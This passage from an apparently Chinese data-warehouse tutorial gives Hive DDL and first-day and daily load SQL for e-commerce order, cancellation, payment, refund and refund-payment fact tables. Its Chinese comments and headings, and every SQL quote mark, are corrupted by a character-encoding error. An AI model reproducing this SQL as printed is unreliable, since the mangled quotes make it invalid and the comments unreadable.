â€˜bootstrap-insertâ€™</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_order_detail_inc partition (dt=â€™2020-06-15â€™)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_id,</p><p>create_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>date_format(data.create_time, â€˜yyyy-MM-ddâ€™) date_id,</p><p>data.create_time,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = â€˜2020-06-15â€™</p><p>and type = â€˜insertâ€™</p><p>) od</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = â€˜2020-06-15â€™</p><p>and type = â€˜insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = â€˜2020-06-15â€™</p><p>and type = â€˜insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = â€˜2020-06-15â€™</p><p>and type = â€˜insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸå–æ¶ˆè®¢å•äº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸå–æ¶ˆè®¢å•äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸå–æ¶ˆè®¢å•äº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸå–æ¶ˆè®¢å•äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_cancel_detail_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_cancel_detail_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•idâ€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`activity_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`activity_rule_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`coupon_id` STRING COMMENT â€˜ä½¿ç”¨ä¼˜æƒ åˆ¸idâ€™,</p><p>`date_id` STRING COMMENT â€˜å–æ¶ˆè®¢å•æ—¥æœŸidâ€™,</p><p>`cancel_time` STRING COMMENT â€˜å–æ¶ˆè®¢å•æ—¶é—´â€™,</p><p>`source_id` STRING COMMENT â€˜æ¥æºç¼–å·â€™,</p><p>`source_type_code` STRING COMMENT â€˜æ¥æºç±»å‹ç¼–ç â€™,</p><p>`source_type_name` STRING COMMENT â€˜æ¥æºç±»å‹åç§°â€™,</p><p>`sku_num` BIGINT COMMENT â€˜å•†å“æ•°é‡â€™,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT â€˜åŸå§‹ä»·æ ¼â€™,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT â€˜æ´»åŠ¨ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT â€˜ä¼˜æƒ åˆ¸ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_total_amount` DECIMAL(16, 2) COMMENT â€˜æœ€ç»ˆä»·æ ¼åˆ†æ‘Šâ€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸå–æ¶ˆè®¢å•æ˜ç»†äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_cancel_detail_inc/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>set hive.exec.dynamic.partition.mode=nonstrict;</p><p>insert overwrite table dwd_trade_cancel_detail_inc partition (dt)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ods_order_info_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>and data.order_status=â€™1003â€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_cancel_detail_inc partition (dt=â€™2020-06-15â€™)</p><p>select</p><p>od.id,</p><p>order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>date_format(canel_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>canel_time,</p><p>source_id,</p><p>source_type,</p><p>dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where (dt=â€™2020-06-15â€™ or dt=date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id,</p><p>data.operate_time canel_time</p><p>from ods_order_info_inc</p><p>where dt = â€˜2020-06-15â€™</p><p>and type = â€˜updateâ€™</p><p>and data.order_status=â€™1003â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>) oi</p><p>on order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where (dt=â€™2020-06-15â€™ or dt=date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where (dt=â€™2020-06-15â€™ or dt=date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type= â€˜bootstrap-insertâ€™)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™24â€™</p><p>)dic</p><p>on od.source_type=dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸæ”¯ä»˜æˆåŠŸäº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸæ”¯ä»˜æˆåŠŸäº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸæ”¯ä»˜æˆåŠŸäº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸæ”¯ä»˜æˆåŠŸäº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_pay_detail_suc_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_pay_detail_suc_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•idâ€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·idâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“idâ€™,</p><p>`province_id` STRING COMMENT â€˜çœä»½idâ€™,</p><p>`activity_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`activity_rule_id` STRING COMMENT â€˜å‚ä¸æ´»åŠ¨è§„åˆ™idâ€™,</p><p>`coupon_id` STRING COMMENT â€˜ä½¿ç”¨ä¼˜æƒ åˆ¸idâ€™,</p><p>`payment_type_code` STRING COMMENT â€˜æ”¯ä»˜ç±»å‹ç¼–ç â€™,</p><p>`payment_type_name` STRING COMMENT â€˜æ”¯ä»˜ç±»å‹åç§°â€™,</p><p>`date_id` STRING COMMENT â€˜æ”¯ä»˜æ—¥æœŸidâ€™,</p><p>`callback_time` STRING COMMENT â€˜æ”¯ä»˜æˆåŠŸæ—¶é—´â€™,</p><p>`source_id` STRING COMMENT â€˜æ¥æºç¼–å·â€™,</p><p>`source_type_code` STRING COMMENT â€˜æ¥æºç±»å‹ç¼–ç â€™,</p><p>`source_type_name` STRING COMMENT â€˜æ¥æºç±»å‹åç§°â€™,</p><p>`sku_num` BIGINT COMMENT â€˜å•†å“æ•°é‡â€™,</p><p>`split_original_amount` DECIMAL(16, 2) COMMENT â€˜åº”æ”¯ä»˜åŸå§‹é‡‘é¢â€™,</p><p>`split_activity_amount` DECIMAL(16, 2) COMMENT â€˜æ”¯ä»˜æ´»åŠ¨ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_coupon_amount` DECIMAL(16, 2) COMMENT â€˜æ”¯ä»˜ä¼˜æƒ åˆ¸ä¼˜æƒ åˆ†æ‘Šâ€™,</p><p>`split_payment_amount` DECIMAL(16, 2) COMMENT â€˜æ”¯ä»˜é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸæˆåŠŸæ”¯ä»˜äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY â€˜\tâ€™</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_pay_detail_suc_inc/â€˜</p><p>TBLPROPERTIES (â€˜orc.compressâ€™ = â€˜snappyâ€™);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_pay_detail_suc_inc partition (dt)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ods_payment_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>and data.payment_status=â€™1602â€™</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where dt = â€˜2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™11â€™</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™24â€™</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_pay_detail_suc_inc partition (dt=â€™2020-06-15â€™)</p><p>select</p><p>od.id,</p><p>od.order_id,</p><p>user_id,</p><p>sku_id,</p><p>province_id,</p><p>activity_id,</p><p>activity_rule_id,</p><p>coupon_id,</p><p>payment_type,</p><p>pay_dic.dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>source_id,</p><p>source_type,</p><p>src_dic.dic_name,</p><p>sku_num,</p><p>split_original_amount,</p><p>split_activity_amount,</p><p>split_coupon_amount,</p><p>split_total_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.source_id,</p><p>data.source_type,</p><p>data.sku_num,</p><p>data.sku_num * data.order_price split_original_amount,</p><p>data.split_total_amount,</p><p>data.split_activity_amount,</p><p>data.split_coupon_amount</p><p>from ods_order_detail_inc</p><p>where (dt = â€˜2020-06-15â€™ or dt = date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) od</p><p>join</p><p>(</p><p>select</p><p>data.user_id,</p><p>data.order_id,</p><p>data.payment_type,</p><p>data.callback_time</p><p>from ods_payment_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and array_contains(map_keys(old),â€™payment_statusâ€™)</p><p>and data.payment_status=â€™1602â€™</p><p>) pi</p><p>on od.order_id=pi.order_id</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where (dt = â€˜2020-06-15â€™ or dt = date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) oi</p><p>on od.order_id = oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.activity_id,</p><p>data.activity_rule_id</p><p>from ods_order_detail_activity_inc</p><p>where (dt = â€˜2020-06-15â€™ or dt = date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) act</p><p>on od.id = act.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>data.order_detail_id,</p><p>data.coupon_id</p><p>from ods_order_detail_coupon_inc</p><p>where (dt = â€˜2020-06-15â€™ or dt = date_add(â€˜2020-06-15â€™,-1))</p><p>and (type = â€˜insertâ€™ or type = â€˜bootstrap-insertâ€™)</p><p>) cou</p><p>on od.id = cou.order_detail_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™11â€™</p><p>) pay_dic</p><p>on pi.payment_type=pay_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code=â€™24â€™</p><p>)src_dic</p><p>on od.source_type=src_dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸé€€å•äº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸé€€å•äº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸé€€å•äº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸé€€å•äº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_order_refund_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_order_refund_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·IDâ€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•IDâ€™,</p><p>`sku_id` STRING COMMENT â€˜å•†å“IDâ€™,</p><p>`province_id` STRING COMMENT â€˜åœ°åŒºIDâ€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`create_time` STRING COMMENT â€˜é€€å•æ—¶é—´â€™,</p><p>`refund_type_code` STRING COMMENT â€˜é€€å•ç±»å‹ç¼–ç â€™,</p><p>`refund_type_name` STRING COMMENT â€˜é€€å•ç±»å‹åç§°â€™,</p><p>`refund_reason_type_code` STRING COMMENT â€˜é€€å•åŸå› ç±»å‹ç¼–ç â€™,</p><p>`refund_reason_type_name` STRING COMMENT â€˜é€€å•åŸå› ç±»å‹åç§°â€™,</p><p>`refund_reason_txt` STRING COMMENT â€˜é€€å•åŸå› æè¿°â€™,</p><p>`refund_num` BIGINT COMMENT â€˜é€€å•ä»¶æ•°â€™,</p><p>`refund_amount` DECIMAL(16, 2) COMMENT â€˜é€€å•é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸé€€å•äº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_order_refund_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_order_refund_inc partition(dt)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ods_order_refund_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code = â€˜15â€™</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code = â€˜13â€™</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><p><strong>ï¼ˆ2ï¼‰æ¯æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_order_refund_inc partition(dt=â€™2020-06-15â€™)</p><p>select</p><p>ri.id,</p><p>user_id,</p><p>order_id,</p><p>sku_id,</p><p>province_id,</p><p>date_format(create_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>create_time,</p><p>refund_type,</p><p>type_dic.dic_name,</p><p>refund_reason_type,</p><p>reason_dic.dic_name,</p><p>refund_reason_txt,</p><p>refund_num,</p><p>refund_amount</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_type,</p><p>data.refund_num,</p><p>data.refund_amount,</p><p>data.refund_reason_type,</p><p>data.refund_reason_txt,</p><p>data.create_time</p><p>from ods_order_refund_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™insertâ€™</p><p>)ri</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=â€™2020-06-15â€™</p><p>and type=â€™updateâ€™</p><p>and data.order_status=â€™1005â€™</p><p>and array_contains(map_keys(old),â€™order_statusâ€™)</p><p>)oi</p><p>on ri.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code = â€˜15â€™</p><p>)type_dic</p><p>on ri.refund_type=type_dic.dic_code</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-15â€™</p><p>and parent_code = â€˜13â€™</p><p>)reason_dic</p><p>on ri.refund_reason_type=reason_dic.dic_code;</p><h3 id="äº¤æ˜“åŸŸé€€æ¬¾æˆåŠŸäº‹åŠ¡äº‹å®è¡¨"><a href="#äº¤æ˜“åŸŸé€€æ¬¾æˆåŠŸäº‹åŠ¡äº‹å®è¡¨" class="headerlink" title="äº¤æ˜“åŸŸé€€æ¬¾æˆåŠŸäº‹åŠ¡äº‹å®è¡¨"></a>äº¤æ˜“åŸŸé€€æ¬¾æˆåŠŸäº‹åŠ¡äº‹å®è¡¨</h3><p><strong>1ï¼‰å»ºè¡¨è¯­å¥</strong></p><p>DROP TABLE IF EXISTS dwd_trade_refund_pay_suc_inc;</p><p>CREATE EXTERNAL TABLE dwd_trade_refund_pay_suc_inc</p><p>(</p><p>`id` STRING COMMENT â€˜ç¼–å·â€™,</p><p>`user_id` STRING COMMENT â€˜ç”¨æˆ·IDâ€™,</p><p>`order_id` STRING COMMENT â€˜è®¢å•ç¼–å·â€™,</p><p>`sku_id` STRING COMMENT â€˜SKUç¼–å·â€™,</p><p>`province_id` STRING COMMENT â€˜åœ°åŒºIDâ€™,</p><p>`payment_type_code` STRING COMMENT â€˜æ”¯ä»˜ç±»å‹ç¼–ç â€™,</p><p>`payment_type_name` STRING COMMENT â€˜æ”¯ä»˜ç±»å‹åç§°â€™,</p><p>`date_id` STRING COMMENT â€˜æ—¥æœŸIDâ€™,</p><p>`callback_time` STRING COMMENT â€˜æ”¯ä»˜æˆåŠŸæ—¶é—´â€™,</p><p>`refund_num` DECIMAL(16, 2) COMMENT â€˜é€€æ¬¾ä»¶æ•°â€™,</p><p>`refund_amount` DECIMAL(16, 2) COMMENT â€˜é€€æ¬¾é‡‘é¢â€™</p><p>) COMMENT â€˜äº¤æ˜“åŸŸæäº¤é€€æ¬¾æˆåŠŸäº‹åŠ¡äº‹å®è¡¨â€™</p><p>PARTITIONED BY (`dt` STRING)</p><p>STORED AS ORC</p><p>LOCATION â€˜/warehouse/gmall/dwd/dwd_trade_refund_pay_suc_inc/â€˜</p><p>TBLPROPERTIES (â€œorc.compressâ€ = â€œsnappyâ€);</p><p><strong>2ï¼‰æ•°æ®è£…è½½</strong></p><p><strong>ï¼ˆ1ï¼‰é¦–æ—¥è£…è½½</strong></p><p>insert overwrite table dwd_trade_refund_pay_suc_inc partition(dt)</p><p>select</p><p>rp.id,</p><p>user_id,</p><p>rp.order_id,</p><p>rp.sku_id,</p><p>province_id,</p><p>payment_type,</p><p>dic_name,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™) date_id,</p><p>callback_time,</p><p>refund_num,</p><p>total_amount,</p><p>date_format(callback_time,â€™yyyy-MM-ddâ€™)</p><p>from</p><p>(</p><p>select</p><p>data.id,</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.payment_type,</p><p>data.callback_time,</p><p>data.total_amount</p><p>from ods_refund_payment_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type = â€˜bootstrap-insertâ€™</p><p>and data.refund_status=â€™1602â€™</p><p>)rp</p><p>left join</p><p>(</p><p>select</p><p>data.id,</p><p>data.user_id,</p><p>data.province_id</p><p>from ods_order_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)oi</p><p>on rp.order_id=oi.id</p><p>left join</p><p>(</p><p>select</p><p>data.order_id,</p><p>data.sku_id,</p><p>data.refund_num</p><p>from ods_order_refund_info_inc</p><p>where dt=â€™2020-06-14â€™</p><p>and type=â€™bootstrap-insertâ€™</p><p>)ri</p><p>on rp.order_id=ri.order_id</p><p>and rp.sku_id=ri.sku_id</p><p>left join</p><p>(</p><p>select</p><p>dic_code,</p><p>dic_name</p><p>from ods_base_dic_full</p><p>where dt=â€™2020-06-14â€™</p><p>and parent_code=â€™11â€™</p><p>)dic</p><p>on 